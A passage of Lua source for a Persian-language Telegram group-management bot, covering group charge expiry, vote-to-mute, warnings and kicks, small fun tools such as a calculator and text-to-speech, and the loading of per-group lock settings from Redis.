              tdcli.sendMessage(tonumber(owner), 0, 1, "\216\167\216\175\217\133\219\140\217\134 " .. UserName .. " \216\168\216\167 \216\162\219\140\216\175\219\140 `" .. msg.from.id .. "` \218\175\216\177\217\136\217\135\219\140 \216\168\216\167 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\178\219\140\216\177 \216\177\216\167 \216\168\217\135 \216\181\217\136\216\177\216\170 \217\134\216\167\217\133\216\173\216\175\217\136\216\175 \216\180\216\167\216\177\218\152 \218\169\216\177\216\175:\n\216\162\219\140\216\175\219\140 \218\175\216\177\217\136\217\135: `" .. msg.to.id .. "`\n\217\134\216\167\217\133 \218\175\216\177\217\136\217\135: " .. UseMark(msg.to.title), 1, "md")
            end
            if lang then
              return "\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\181\217\136\216\177\216\170 \217\134\216\167\217\133\216\173\216\175\217\136\216\175 \216\180\216\167\216\177\218\152 \216\180\216\175"
            else
              return "Group Has Been Unlimited Charged"
            end
          end
        end
        if (matches[1]:lower() == "check" or matches[1] == "\216\168\216\177\216\177\216\179\219\140") and is_owner(msg) and not matches[2] then
          if redis:get("CheckExpire:" .. msg.to.id) == "unlimited" then
            if not lang then
              return "Groups Charge is Unlimited!"
            else
              return "\216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \217\134\216\167\217\133\216\173\216\175\217\136\216\175 \216\167\216\179\216\170!"
            end
          end
          local EXP = redis:ttl("ExpireDate:" .. msg.to.id)
          local day = math.ceil(EXP / 86400)
          if lang then
            return "`" .. day .. "` \216\177\217\136\216\178 \216\170\216\167 \216\167\216\170\217\133\216\167\217\133 \216\180\216\167\216\177\218\152"
          else
            return "`" .. day .. "` *Day To Finish Charge*"
          end
        end
        if (matches[1]:lower() == "check" or matches[1]:lower() == "\216\168\216\177\216\177\216\179\219\140") and is_sudo(msg) and matches[2] and string.match(matches[2], "^-%d+$") then
          if redis:get("CheckExpire:" .. matches[2]) == "unlimited" then
            if not lang then
              return "Groups Charge is Unlimited!"
            else
              return "\216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \217\134\216\167\217\133\216\173\216\175\217\136\216\175 \216\167\216\179\216\170!"
            end
          end
          local EXP = redis:ttl("ExpireDate:" .. matches[2])
          local day = math.ceil(EXP / 86400)
          if lang then
            return "`" .. day .. "` \216\177\217\136\216\178 \216\170\216\167 \216\167\216\170\217\133\216\167\217\133 \216\180\216\167\216\177\218\152"
          else
            return "`" .. day .. "` *Day To Finish Charge*"
          end
        end
      end
      if (matches[1]:lower() == "creategroup" or matches[1] == "\216\179\216\167\216\174\216\170 \218\175\216\177\217\136\217\135") and is_sudo(msg) then
        local text = matches[2]
        tdcli.createNewChannelChat(text, 1, "", dl_cb, nil)
        if not lang then
          return "*SuperGroup Has Been Created!*"
        else
          return "\216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \216\179\216\167\216\174\216\170\217\135 \216\180\216\175!"
        end
      end
      if (matches[1]:lower() == "tosuper" or matches[1] == "\216\170\216\168\216\175\219\140\217\132 \216\168\217\135 \216\167\216\168\216\177\218\175\216\177\217\136\217\135") and is_owner(msg) then
        local id = msg.to.id
        tdcli.migrateGroupChatToChannelChat(id, dl_cb, nil)
      end
      if (matches[1]:lower() == "sudolist" or matches[1] == "\217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136") and is_sudo(msg) then
        return sudolist(msg)
      end
      if (matches[1]:lower() == "chats" or matches[1] == "\218\134\216\170 \217\135\216\167") and is_sudo(msg) then
        chat_list(msg)
      end
      if (matches[1]:lower() == "join" or matches[1] == "\216\172\217\136\219\140\217\134") and is_sudo(msg) and matches[2] and matches[2]:match("^-%d+$") then
        tdcli.sendMessage(msg.to.id, msg.id, 1, "\216\180\217\133\216\167 \216\175\216\185\217\136\216\170 \216\180\216\175\219\140\216\175 \216\168\217\135: " .. matches[2], 1)
        tdcli.addChatMember(matches[2], msg.from.id, 0, dl_cb, nil)
      end
      if (matches[1]:lower() == "leave" or matches[1] == "\216\170\216\177\218\169 \218\175\216\177\217\136\217\135") and is_sudo(msg) then
        tdcli.changeChatMemberStatus(msg.to.id, our_id, "Left", dl_cb, nil)
      end
      if (matches[1]:lower() == "autoleave" or matches[1] == "\216\170\216\177\218\169 \216\174\217\136\216\175\218\169\216\167\216\177") and is_sudo(msg) then
        if matches[2] == "off" or matches[2] == "\216\174\216\167\217\133\217\136\216\180" then
          redis:del("AutoLeaveBot")
          return "\216\170\216\177\218\169 \216\174\217\136\216\175\218\169\216\167\216\177 \218\175\216\177\217\136\217\135 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175"
        elseif matches[2] == "on" or matches[2] == "\216\177\217\136\216\180\217\134" then
          redis:set("AutoLeaveBot", true)
          return "\216\170\216\177\218\169 \216\174\217\136\216\175\218\169\216\167\216\177 \218\175\216\177\217\136\217\135 \216\177\217\136\216\180\217\134 \216\180\216\175"
        end
      end
      function mmber(extra, result, success)
        number = result.member_count_
      end
      if matches[1]:lower() == "votemute" or matches[1] == "\216\177\216\167\219\140 \217\133\219\140\217\136\216\170" then
        tdcli.getChannelFull(msg.to.id, mmber)
        is_sabt = 1 < redis:ttl("sabt:" .. msg.from.id .. ":" .. msg.to.id)
        if is_sabt then
          if not lang then
            return "*You can vote only once for 30 min*"
          else
            return "\216\180\217\133\216\167 \217\129\217\130\216\183 \219\140\218\169\216\168\216\167\216\177 \216\168\216\177\216\167\219\140 30 \216\175\217\130\219\140\217\130\217\135 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\177\216\167\219\140 \216\168\216\175\217\135\219\140\216\175"
          end
        else
          user = matches[2]
          chat = msg.to.id
          expire = 1800
          hash = "votemute:" .. user .. "from:" .. chat
          members = tonumber(number)
          if not members then
            return "Error!"
          elseif 10 > members then
            if not lang then
              return "*Minimum members for vote is* `10` *members now is:* `" .. number .. "`"
            else
              return "\216\173\216\175\216\167\217\130\217\132 \216\170\216\185\216\175\216\167\216\175 \216\167\216\185\216\182\216\167 \216\168\216\177\216\167\219\140 \216\177\216\167\219\140 \218\175\219\140\216\177\219\140 `10` *\217\133\219\140 \216\168\216\167\216\180\216\175 \216\170\216\185\216\175\216\167\216\175 \216\167\216\185\216\182\216\167 \216\175\216\177 \216\173\216\167\217\132 \216\173\216\167\216\182\216\177:* `" .. number .. "`"
            end
          end
          if is_silent_user(user, chat) then
            if not lang then
              return "*User* `" .. user .. "` *is already muted!*"
            else
              return "\218\169\216\167\216\177\216\168\216\177 `" .. user .. "` \216\167\216\178 \217\130\216\168\217\132 \217\133\219\140\217\136\216\170 \216\167\216\179\216\170!"
            end
          elseif not redis:get(hash) then
            redis:set(hash, "1")
            redis:setex("sabt:" .. msg.from.id .. ":" .. msg.to.id, expire, true)
            if not lang then
              return "*[1/10] Voted for mute user *`" .. user .. "`"
            else
              return "*[1/10]* \216\177\216\167\219\140 \216\175\216\167\216\175\217\135 \216\180\216\175 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170 \218\169\216\167\216\177\216\168\216\177 `" .. user .. "`"
            end
          elseif redis:get(hash) then
            if members < 50 then
              votes = 5
            elseif members > 50 and 100 > members then
              votes = 10
            elseif 100 < members and members < 500 then
              votes = 15
            elseif members > 500 and members < 1000 then
              votes = 20
            elseif members > 1000 then
              votes = 25
            end
            now = redis:get(hash) + 1
            last = redis:get(hash) - 1
            fixed = redis:get(hash) + 0
            if votes == now and votes - 1 == fixed then
              redis:del(hash)
              redis:setex("sabt:" .. msg.from.id .. ":" .. msg.to.id, expire, true)
              redis:sadd("GroupSilentUsers:" .. msg.to.id, user)
              if not lang then
                return "*[" .. votes .. "/" .. votes .. "] Finished! *`" .. user .. "`* has been muted by members vote*"
              else
                return "*[" .. votes .. "/" .. votes .. "]* \216\170\217\133\216\167\217\133 \216\180\216\175! `" .. user .. "` \216\168\216\167 \216\177\216\167\219\140 \216\167\216\185\216\182\216\167 \217\133\219\140\217\136\216\170 \216\180\216\175"
              end
            elseif votes > fixed and votes - 1 ~= fixed then
              redis:set(hash, now)
              redis:setex("sabt:" .. msg.from.id .. ":" .. msg.to.id, expire, true)
              if not lang then
                return "*[" .. redis:get(hash) .. "/" .. votes .. "] Voted for mute user *`" .. user .. "`"
              else
                return "*[" .. redis:get(hash) .. "/" .. votes .. "]* \216\177\216\167\219\140 \216\175\216\167\216\175\217\135 \216\180\216\175 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170 \218\169\216\167\216\177\216\168\216\177 `" .. user .. "`"
              end
            end
          end
        end
      end
      if (matches[1]:lower() == "delmute" or matches[1] == "\216\173\216\176\217\129 \217\133\219\140\217\136\216\170") and is_mod(msg) then
        hash = "votemute:" .. tonumber(matches[2]) .. "from:" .. msg.to.id
        if redis:get(hash) then
          redis:del(hash)
          if not lang then
            return "*Votemute of* [`" .. matches[2] .. "`] *has been cleaned!*"
          else
            return "\216\177\216\167\219\140 \218\175\219\140\216\177\219\140 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170 [`" .. matches[2] .. "`] \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!"
          end
        elseif not lang then
          return "*User* [`" .. matches[2] .. "`] *has not votemute!*"
        else
          return "*\218\169\216\167\216\177\216\168\216\177* [`" .. matches[2] .. "`] *\216\177\216\167\219\140 \218\175\219\140\216\177\219\140 \217\133\219\140\217\136\216\170 \217\134\216\175\216\167\216\177\216\175!*"
        end
      end
      if (matches[1]:lower() == "warn" or matches[1] == "\216\167\216\174\216\183\216\167\216\177") and is_mod(msg) then
        hash2 = "gp_lang:" .. msg.to.id
        lang = redis:get(hash2)
        function warn(extra, result, success)
          user = result.sender_user_id_
          chat = result.chat_id_
          hash = "warn:" .. user .. ":From:" .. result.chat_id_
          MaxWarn = redis:hget("GroupSettings:" .. result.chat_id_, "MaxWarn") or 5
          if isModerator(chat, user) then
            return NoAccess(chat)
          elseif not redis:get(hash) then
            redis:set(hash, 1)
            if not lang then
              text = "[`1`/`" .. MaxWarn .. "`] *Admin* " .. msg.from.first_name .. " *give warn to* `" .. user .. [[
`
*Reason:* ]] .. matches[2]
              tdcli.sendMessage(result.chat_id_, msg.id_, 0, text, 0, "md")
            else
              text = "[`1`/`" .. MaxWarn .. "`] \216\167\216\175\217\133\219\140\217\134 " .. msg.from.first_name .. " \219\140\218\169 \216\167\216\174\216\183\216\167\216\177 \216\175\216\167\216\175 \216\168\217\135 `" .. user .. "`\n\216\175\217\132\219\140\217\132: " .. matches[2]
              tdcli.sendMessage(result.chat_id_, msg.id_, 0, text, 0, "md")
            end
          else
            after = tonumber(redis:get(hash)) + 1
            if after == tonumber(MaxWarn) then
              redis:del(hash)
              if not lang then
                text = "[`" .. after .. "`/`" .. MaxWarn .. "`] [`Finish`] *Admin* " .. msg.from.first_name .. " *give warn to* `" .. user .. [[
`
*Reason:* ]] .. matches[2]
                tdcli.sendMessage(result.chat_id_, msg.id_, 0, text, 0, "md")
              else
                text = "[`" .. after .. "`/`" .. MaxWarn .. "`] [`\216\170\217\133\216\167\217\133`] \216\167\216\175\217\133\219\140\217\134 " .. msg.from.first_name .. " \219\140\218\169 \216\167\216\174\216\183\216\167\216\177 \216\175\216\167\216\175 \216\168\217\135 `" .. user .. "`\n\216\175\217\132\219\140\217\132: " .. matches[2]
                tdcli.sendMessage(result.chat_id_, msg.id_, 0, text, 0, "md")
              end
              if not redis:get("WarnStatus:" .. result.chat_id_) then
                kick_user(user, chat)
                if not lang then
                  tdcli.sendMessage(result.chat_id_, msg.id_, 0, "*User* `" .. user .. "` *has been kicked for complete warnings*", 0, "md")
                else
                  tdcli.sendMessage(result.chat_id_, msg.id_, 0, "\216\180\216\174\216\181 `" .. user .. "` \216\168\216\177\216\167\219\140 \216\170\218\169\217\133\219\140\217\132 \216\167\216\174\216\183\216\167\216\177 \217\135\216\167 \217\133\216\179\216\175\217\136\216\175 \216\180\216\175", 0, "md")
                end
              elseif redis:get("WarnStatus:" .. result.chat_id_) == "block" then
                kick_user(user, chat)
                if not lang then
                  tdcli.sendMessage(result.chat_id_, msg.id_, 0, "*User* `" .. user .. "` *has been kicked for complete warnings*", 0, "md")
                else
                  tdcli.sendMessage(result.chat_id_, msg.id_, 0, "\216\180\216\174\216\181 `" .. user .. "` \216\168\216\177\216\167\219\140 \216\170\218\169\217\133\219\140\217\132 \216\167\216\174\216\183\216\167\216\177 \217\135\216\167 \217\133\216\179\216\175\217\136\216\175 \216\180\216\175", 0, "md")
                end
              elseif redis:get("WarnStatus:" .. result.chat_id_) == "mute" then
                redis:sadd("GroupSilentUsers:" .. result.chat_id_, user)
                if not lang then
                  tdcli.sendMessage(result.chat_id_, msg.id_, 0, "*User* `" .. user .. "` *has been added to silent list for complete warnings*", 0, "md")
                else
                  tdcli.sendMessage(result.chat_id_, msg.id_, 0, "\216\180\216\174\216\181 `" .. user .. "` \216\168\216\177\216\167\219\140 \216\170\218\169\217\133\219\140\217\132 \216\167\216\174\216\183\216\167\216\177 \217\135\216\167 \216\168\217\135 \217\132\219\140\216\179\216\170 \216\167\217\129\216\177\216\167\216\175 \216\179\216\167\218\169\216\170 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175", 0, "md")
                end
              end
            elseif after < tonumber(MaxWarn) then
              redis:set(hash, after)
              if not lang then
                text = "[`" .. after .. "`/`" .. MaxWarn .. "`] *Admin* " .. msg.from.first_name .. " *give warn to* `" .. user .. [[
`
*Reason:* ]] .. matches[2]
                tdcli.sendMessage(result.chat_id_, msg.id_, 0, text, 0, "md")
              else
                text = "[`" .. after .. "`/`" .. MaxWarn .. "`] \216\167\216\175\217\133\219\140\217\134 " .. msg.from.first_name .. " \219\140\218\169 \216\167\216\174\216\183\216\167\216\177 \216\175\216\167\216\175 \216\168\217\135 `" .. user .. "`\n\216\175\217\132\219\140\217\132: " .. matches[2]
                tdcli.sendMessage(result.chat_id_, msg.id_, 0, text, 0, "md")
              end
            end
          end
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_to_message_id_
        }, warn, nil)
      end
      if (matches[1]:lower() == "delwarn" or matches[1]:lower() == "cleanwarn" or matches[1] == "\216\173\216\176\217\129 \216\167\216\174\216\183\216\167\216\177") and is_mod(msg) then
        if matches[2] and not msg.reply_id then
          user = matches[2]
          hash = "warn:" .. user .. ":From:" .. msg.to.id
          if isModerator(msg.to.id, user) then
            return NoAccess(msg.to.id)
          elseif redis:get(hash) then
            redis:del(hash)
            return SendStatus(msg.to.id, user, "Warns Cleaned", "\216\167\216\174\216\183\216\167\216\177 \217\135\216\167 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175")
          else
            return SendStatus(msg.to.id, user, "No Warns", "\216\167\216\174\216\183\216\167\216\177\219\140 \217\134\216\175\216\167\216\177\216\175")
          end
        elseif not matches[2] and msg.reply_id then
          function delwarn(extra, result, success)
            user = result.sender_user_id_
            hash = "warn:" .. user .. ":From:" .. msg.to.id
            if isModerator(msg.to.id, user) then
              return NoAccess(msg.to.id)
            elseif redis:get(hash) then
              redis:del(hash)
              return SendStatus(msg.to.id, user, "Warns Cleaned", "\216\167\216\174\216\183\216\167\216\177 \217\135\216\167 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175")
            else
              return SendStatus(msg.to.id, user, "No Warns", "\216\167\216\174\216\183\216\167\216\177\219\140 \217\134\216\175\216\167\216\177\216\175")
            end
          end
          tdcli_function({
            ID = "GetMessage",
            chat_id_ = msg.to.id,
            message_id_ = msg.reply_to_message_id_
          }, delwarn, nil)
        end
      end
      if (matches[1]:lower() == "warnstatus" or matches[1] == "\217\136\216\182\216\185\219\140\216\170 \216\167\216\174\216\183\216\167\216\177") and is_owner(msg) then
        hash = "WarnStatus:" .. msg.to.id
        if matches[2] == "block" or matches[2] == "\217\133\216\179\216\175\217\136\216\175" then
          redis:set(hash, "block")
          if not lang then
            tdcli.sendMessage(msg.to.id, msg.id_, 0, "*Warn status has been changed to* `block`", 0, "md")
          else
            tdcli.sendMessage(msg.to.id, msg.id_, 0, "*\217\136\216\182\216\185\219\140\216\170 \216\167\216\174\216\183\216\167\216\177 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135* `\217\133\216\179\216\175\217\136\216\175`", 0, "md")
          end
        elseif matches[2] == "silent" or matches[2] == "\216\179\218\169\217\136\216\170" then
          redis:set(hash, "mute")
          if not lang then
            tdcli.sendMessage(msg.to.id, msg.id_, 0, "*Warn status has been changed to* `silent`", 0, "md")
          else
            tdcli.sendMessage(msg.to.id, msg.id_, 0, "*\217\136\216\182\216\185\219\140\216\170 \216\167\216\174\216\183\216\167\216\177 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135* `\216\179\218\169\217\136\216\170`", 0, "md")
          end
        end
      end
    end
  end
  RedisFunTools = redis:get("EditBot:funtools")
  if RedisFunTools then
    function DownloadToFile(url, file_name)
      respbody = {}
      options = {
        url = url,
        sink = ltn12.sink.table(respbody),
        redirect = true
      }
      response = nil
      if url:starts("https") then
        options.redirect = false
        response = {
          https.request(options)
        }
      else
        response = {
          http.request(options)
        }
      end
      i = response[2]
      headers = response[3]
      status = response[4]
      if i ~= 200 then
        return nil
      end
      patch = "data/" .. file_name
      file = io.open(patch, "w+")
      file:write(table.concat(respbody))
      file:close()
      return patch
    end
    if RedisFunTools == "all" or RedisFunTools == "sudo" and is_sudo(msg) or RedisFunTools == "owner" and is_owner(msg) or RedisFunTools == "moderator" and is_mod(msg) then
      local CheckUseHash = "CheckUseFun:" .. msg.to.id .. ":" .. msg.from.id
      local CheckUse = tonumber(redis:get(CheckUseHash)) or 0
      if CheckUse < 10 or is_mod(msg) then
        if matches[1]:lower() == "video" then
          GetHelper(msg, matches[2] .. "Full Movie", "youtube", "Video With Name " .. matches[2] .. " Not Found!", "\217\129\219\140\217\132\217\133\219\140 \216\168\216\167 \216\185\217\134\217\136\216\167\217\134 " .. matches[2] .. " \217\190\219\140\216\175\216\167 \217\134\216\180\216\175!")
        end
        if matches[1]:lower() == "poll" or matches[1] == "\217\134\216\184\216\177\216\179\217\134\216\172\219\140" then
          GetHelper(msg, matches[2], "like", "Error!", "\217\133\216\180\218\169\217\132\219\140 \216\168\217\135 \217\136\216\172\217\136\216\175 \216\162\217\133\216\175!")
        end
        if matches[1]:lower() == "calc" or matches[1] == "\217\133\216\167\216\180\219\140\217\134 \216\173\216\179\216\167\216\168" then
          URL = require("socket.url")
          k, i = http.request("http://api.mathjs.org/v1/?expr=" .. URL.escape(matches[2]))
          if i == 200 then
            text = "\217\133\216\173\216\167\216\179\216\168\216\167\216\170 \216\167\217\134\216\172\216\167\217\133 \216\180\216\175: " .. k
          elseif i == 400 then
            text = k
          else
            return SendError(msg, "*There Was A Problem Please Try Again Later!*", "\217\133\216\180\218\169\217\132\219\140 \216\168\217\135 \217\136\216\172\217\136\216\175 \216\162\217\133\216\175 \217\132\216\183\217\129\216\167 \216\168\216\185\216\175\216\167 \216\175\217\136\216\168\216\167\216\177\217\135 \216\170\217\132\216\167\216\180 \218\169\217\134\219\140\216\175!")
          end
          return UseMark(text)
        end
        if matches[1]:lower() == "tovoice" or matches[1] == "\216\168\217\135 \216\181\216\175\216\167" then
          text = matches[2]
          text = text:gsub(" ", ".")
          url = "http://tts.baidu.com/text2audio?lan=en&ie=UTF-8&text=" .. text
          name = "voice:" .. msg.from.id .. ".mp3"
          file = DownloadToFile(url, name)
          if not lang then
            txt = "Requested Text: " .. UseMark(matches[2])
          else
            txt = "\217\133\216\170\217\134 \216\175\216\177\216\174\217\136\216\167\216\179\216\170\219\140: " .. UseMark(matches[2])
          end
          tdcli.sendDocument(msg.to.id, msg.id_, 0, 1, nil, file, "")
          io.popen("rm data/" .. name):read("*all")
        end
        if matches[1]:lower() == "time" or matches[1] == "\216\179\216\167\216\185\216\170" then
          t = os.date():match("%d+:%d+")
          if t == "No connection" then
            return SendError(msg, "*There Was A Problem Please Try Again Later!*", "\217\133\216\180\218\169\217\132\219\140 \216\168\217\135 \217\136\216\172\217\136\216\175 \216\162\217\133\216\175 \217\132\216\183\217\129\216\167 \216\168\216\185\216\175\216\167 \216\175\217\136\216\168\216\167\216\177\217\135 \216\170\217\132\216\167\216\180 \218\169\217\134\219\140\216\175!")
          end
          colors = {
            "blue",
            "green",
            "yellow",
            "magenta",
            "Orange",
            "DarkOrange",
            "red"
          }
          fonts = {
            "mathbf",
            "mathit",
            "mathfrak",
            "mathrm"
          }
          url = "http://latex.codecogs.com/png.download?" .. "\\dpi{600}%20\\huge%20\\" .. fonts[math.random(#fonts)] .. "{{\\color{" .. colors[math.random(#colors)] .. "}" .. t .. "}}"
          name = "time.webp"
          file = DownloadToFile(url, name)
          tdcli.sendDocument(msg.to.id, 0, 0, 1, nil, file)
          io.popen("rm data/" .. name):read("*all")
        end
        if matches[1]:lower() == "bold" or matches[1] == "\217\133\216\170\217\134 \218\169\217\132\217\129\216\170" then
          tdcli.sendMessage(msg.to.id, msg.id_, 1, "*" .. matches[2] .. "*", 1, "md")
        elseif matches[1]:lower() == "italic" or matches[1] == "\217\133\216\170\217\134 \218\169\216\172" then
          tdcli.sendMessage(msg.to.id, msg.id_, 1, "_" .. matches[2] .. "_", 1, "md")
        elseif matches[1]:lower() == "code" or matches[1] == "\217\133\216\170\217\134 \218\169\216\175" then
          tdcli.sendMessage(msg.to.id, msg.id_, 1, "`" .. matches[2] .. "`", 1, "md")
        end
        if not is_mod(msg) then
          if 0 <= redis:ttl(CheckUseHash) then
            CheckUseTime = redis:ttl(CheckUseHash)
          else
            CheckUseTime = 86400
          end
          redis:setex(CheckUseHash, tonumber(CheckUseTime), CheckUse + 1)
        end
      end
    end
  end
end
local pre_process = function(msg)
  if not redis:sismember("FixCleanMSG:" .. msg.to.id, msg.from.id) then
    redis:sadd("FixCleanMSG:" .. msg.to.id, msg.from.id)
  end
  local chat = msg.chat_id_
  local user = msg.from.id
  local is_channel = msg.to.type == "channel"
  local is_chat = msg.to.type == "chat"
  local data = load_data("./data/moderation.json")
  local hash = "gp_lang:" .. chat
  local lang = redis:get(hash)
  local sense = redis:get("sense:" .. chat)
  if is_channel then
    if not data[tostring(msg.to.id)] and redis:get("AutoLeaveBot") and not is_sudo(msg) and not is_botOwner(msg) then
      tdcli.sendMessage(msg.chat_id_, 0, 0, "`\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!`", 0, "md")
      for v, owner in pairs(_config.bot_owner) do
        tdcli.sendMessage(owner, 0, 0, "\216\177\216\168\216\167\216\170 \216\168\217\135 \218\175\216\177\217\136\217\135 " .. msg.to.id .. " \216\168\216\167 \217\134\216\167\217\133 " .. UseMark(msg.to.title) .. " \216\168\217\135 \216\181\217\136\216\177\216\170 \216\186\219\140\216\177\217\133\216\172\216\167\216\178 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175\217\135 \216\168\217\136\216\175", 0)
      end
      tdcli.changeChatMemberStatus(chat, our_id, "Left", dl_cb, nil)
    end
    do
      local target = msg.chat_id_
      local mute_all = "no"
      local mute_gif = "no"
      local mute_text = "no"
      local mute_photo = "no"
      local mute_video = "no"
      local mute_audio = "no"
      local mute_voice = "no"
      local mute_sticker = "no"
      local mute_contact = "no"
      local mute_forward = "no"
      local mute_location = "no"
      local mute_document = "no"
      local mute_tgservice = "no"
      local mute_inline = "no"
      local mute_game = "no"
      local mute_keyboard = "no"
      local lock_link = "no"
      local lock_tag = "no"
      local lock_mention = "no"
      local lock_arabic = "no"
      local lock_edit = "no"
      local lock_spam = "no"
      local lock_flood = "no"
      local lock_bots = "no"
      local lock_markdown = "no"
      local lock_webpage = "no"
      local lock_pin = "no"
      local lock_MaxWords = "no"
      local lock_fohsh = "no"
      local lock_english = "no"
      local lock_forcedinvite = "no"
      local lock_username = redis:hget("GroupSettings:" .. target, "lock_username") or "no"
      local lock_join = redis:hget("GroupSettings:" .. target, "lock_join") or "no"
      local lock_note = redis:hget("GroupSettings:" .. target, "lock_note") or "no"
      local lock_withcaption = redis:hget("GroupSettings:" .. target, "lock_withcaption") or "no"
      local lock_nocaption = redis:hget("GroupSettings:" .. target, "lock_nocaption") or "no"
      if redis:hget("GroupSettings:" .. target, "mute_all") == "yes" then
        mute_all = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_gif") == "yes" then
        mute_gif = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_text") == "yes" then
        mute_text = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_photo") == "yes" then
        mute_photo = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_video") == "yes" then
        mute_video = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_audio") == "yes" then
        mute_audio = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_voice") == "yes" then
        mute_voice = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_sticker") == "yes" then
        mute_sticker = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_contact") == "yes" then
        mute_contact = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_forward") == "yes" then
        mute_forward = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_location") == "yes" then
        mute_location = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_document") == "yes" then
        mute_document = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_tgservice") == "yes" then
        mute_tgservice = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_inline") == "yes" then
        mute_inline = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_game") == "yes" then
        mute_game = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "mute_keyboard") == "yes" then
        mute_keyboard = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "num_msg_max") then
        NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. target, "num_msg_max"))
      else
        NUM_MSG_MAX = 5
      end
      if redis:hget("GroupSettings:" .. target, "MaxWords") then
        MaxWords = tonumber(redis:hget("GroupSettings:" .. target, "MaxWords"))
      else
        MaxWords = 50
      end
      if redis:hget("GroupSettings:" .. target, "MaxWarn") then
        MaxWarn = tonumber(redis:hget("GroupSettings:" .. target, "MaxWarn"))
      else
        MaxWarn = 5
      end
      if redis:hget("GroupSettings:" .. target, "FloodTime") then
        FloodTime = tonumber(redis:hget("GroupSettings:" .. target, "FloodTime"))
      else
        FloodTime = 30
      end
      if redis:hget("GroupSettings:" .. target, "ForcedInvite") then
        ForcedInvite = tonumber(redis:hget("GroupSettings:" .. target, "ForcedInvite"))
      else
        ForcedInvite = 2
      end
      if redis:hget("GroupSettings:" .. target, "lock_link") == "yes" then
        lock_link = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_tag") == "yes" then
        lock_tag = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_mention") == "yes" then
        lock_mention = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_arabic") == "yes" then
        lock_arabic = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_edit") == "yes" then
        lock_edit = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_spam") == "yes" then
        lock_spam = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "flood") == "yes" then
        lock_flood = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_bots") == "yes" then
        lock_bots = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_markdown") == "yes" then
        lock_markdown = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_webpage") == "yes" then
        lock_webpage = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_pin") == "yes" then
        lock_pin = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_MaxWords") == "yes" then
        lock_MaxWords = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_fohsh") == "yes" then
        lock_fohsh = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_english") == "yes" then
        lock_english = "yes"
      end
      if redis:hget("GroupSettings:" .. target, "lock_forcedinvite") == "yes" then
        lock_forcedinvite = "yes"
      end
    if (msg.adduser or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatDeleteMember") and not redis:sismember("GroupSilentUsers:"..msg.to.id, msg.from.id) then
	if mute_tgservice == "yes" then
		del_msg(chat, tonumber(msg.id))
	end
end
      if msg.content_.ID == "MessagePinMessage" and is_channel and lock_pin == "yes" then
        if is_owner(msg) then
          return
        end
        if tonumber(msg.from.id) == our_id then
          return
        end
        local pin_msg = data[tostring(chat)].pin
        if pin_msg then
          tdcli.pinChannelMessage(msg.chat_id_, pin_msg, 1)
        elseif not pin_msg then
          tdcli.unpinChannelMessage(msg.chat_id_)
        end
        if lang then
          tdcli.sendMessage(msg.chat_id_, msg.id, 0, "<b>User ID :</b> <code>" .. msg.from.id .. [[
</code>
